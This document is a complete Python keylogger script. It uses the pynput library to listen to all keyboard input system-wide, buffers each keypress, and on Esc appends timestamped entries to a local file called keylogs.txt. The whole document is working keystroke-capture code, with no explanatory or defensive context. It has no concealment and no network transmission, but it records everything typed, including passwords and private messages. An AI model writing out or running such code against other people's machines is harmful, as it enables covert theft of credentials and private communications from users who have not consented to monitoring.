```python
import os
import sys
from datetime import datetime
import logging

try:
    import pynput
except ImportError:
    print("pynput library is not installed. Please install it using pip.")
    sys.exit()

key_log = []
log_file = "keylogs.txt"

def on_press(key):
    if key == pynput.keyboard.Key.esc:
        write_to_file()
        return False
    else:
        key_log.append(str(key))

def write_to_file():
    with open(log_file, "a") as f:
        for i in key_log:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{now} {i}\n")
        print("Keylogs saved.")
        key_log.clear()

def on_release(key):
    pass

def main():
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
```